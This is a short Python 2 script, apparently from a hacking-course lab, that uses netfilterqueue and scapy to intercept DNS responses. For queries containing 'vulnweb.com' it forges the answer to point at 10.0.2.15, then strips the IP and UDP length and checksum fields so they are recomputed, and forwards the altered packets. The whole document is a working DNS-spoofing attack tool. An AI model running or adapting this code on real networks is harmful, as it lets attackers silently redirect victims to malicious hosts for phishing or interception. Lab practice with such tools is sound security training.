# netfilterqueue has some issues with pyhton3, so using python2 to run this script
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())#convert packet to scapy packet
    #print(packet.get_payload())#get details about packet
    #DNSRR -> [ DNS Resource Record ]
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "vulnweb.com" in qname:
            print("[+] Spoofing target")
            #create a DNS answer to spoof the target that the ip of www.bing.com is 10.0.2.15
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            #Bypass check
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))#convert scapy_packet to normal String and replace the original payload
        #print(scapy_packet.show())#get details about scapy packet
    packet.accept()#forward packet
    #packet.drop()#drop packet

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)#process_packet is a function to handle every packet trapped
queue.run()

